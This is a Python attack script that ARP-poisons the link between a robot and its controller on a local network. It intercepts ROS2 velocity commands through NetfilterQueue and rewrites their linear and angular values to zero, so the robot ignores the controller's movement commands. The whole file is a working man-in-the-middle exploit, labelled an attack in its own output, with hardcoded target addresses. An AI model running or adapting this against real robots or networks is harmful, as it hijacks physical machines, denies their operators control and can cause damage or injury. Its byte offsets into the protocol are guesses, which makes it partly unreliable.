from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import re
import struct

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    print(f"[*] Pinging {ip} to populate ARP cache...")
    subprocess.run(["ping", "-c", "2", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip and fields[3] != "00:00:00:00:00:00":
                    return fields[3]
    except Exception as e:
        print(f"[!] Error reading ARP table: {e}")
    return None

def spoof(target_ip, host_ip, target_mac):
    # Tell target_ip that host_ip is at OUR MAC address
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, iface=interface, verbose=False)

def arp_poison_thread(robot_mac, controller_mac):
    print("[*] ARP Poisoning Thread Active... (Ctrl+C to stop)")
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(2) 

# --- PACKET MANIPULATION ---
def process_packet(packet):
    try:
        scapy_pkt = IP(packet.get_payload())
        
        # Only process UDP packets with data
        if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
            raw_data = scapy_pkt[Raw].load
            
            # Find the RTPS Data Submessage Marker (0x15 0x05)
            marker = b'\x15\x05'
            marker_pos = raw_data.find(marker)
            
            if marker_pos != -1:
                # ROS2 Twist Linear X is typically 28 bytes after the marker
                # ROS2 Twist Angular Z is typically 68 bytes after the marker
                lin_x_offset = marker_pos + 28
                ang_z_offset = marker_pos + 68
                
                if len(raw_data) >= ang_z_offset + 8:
                    # Read original values for the log
                    orig_lin_x = struct.unpack('<d', raw_data[lin_x_offset:lin_x_offset+8])[0]
                    orig_ang_z = struct.unpack('<d', raw_data[ang_z_offset:ang_z_offset+8])[0]

                    # Only modify if it looks like an actual movement command
                    if abs(orig_lin_x) > 0.001 or abs(orig_ang_z) > 0.001:
                        # Pack 0.0 into 8-byte doubles (Little Endian)
                        stop_bytes = struct.pack('<d', 0.0)
                        
                        # Overwrite Linear X and Angular Z to stop all movement/turning
                        modified_payload = (
                            raw_data[:lin_x_offset] + 
                            stop_bytes + 
                            raw_data[lin_x_offset+8:ang_z_offset] + 
                            stop_bytes + 
                            raw_data[ang_z_offset+8:]
                        )
                        
                        scapy_pkt[Raw].load = modified_payload
                        
                        # Recalculate Checksums so the Robot accepts the packet
                        del scapy_pkt[IP].len
                        del scapy_pkt[IP].chksum
                        del scapy_pkt[UDP].len
                        del scapy_pkt[UDP].chksum
                        
                        packet.set_payload(bytes(scapy_pkt))
                        print(f"[!] KILLED movement: LinX:{orig_lin_x:.2f} AngZ:{orig_ang_z:.2f} -> 0.0")

    except Exception as e:
        print(f"[!] Error processing packet: {e}")
    
    # Always accept the packet to keep traffic flowing
    packet.accept()

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    robot_mac = get_mac(robot_ip)
    controller_mac = get_mac(controller_ip)
    
    if not robot_mac or not controller_mac:
        print("[!] MAC discovery failed. Check network connection.")
        exit(1)
        
    # Start the ARP spoofing in the background
    threading.Thread(target=arp_poison_thread, args=(robot_mac, controller_mac), daemon=True).start()
    
    # Bind to the Netfilter Queue
    nfqueue = NetfilterQueue()
    nfqueue.bind(queue_number, process_packet)
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Stopping attack and cleaning up...")
        nfqueue.unbind()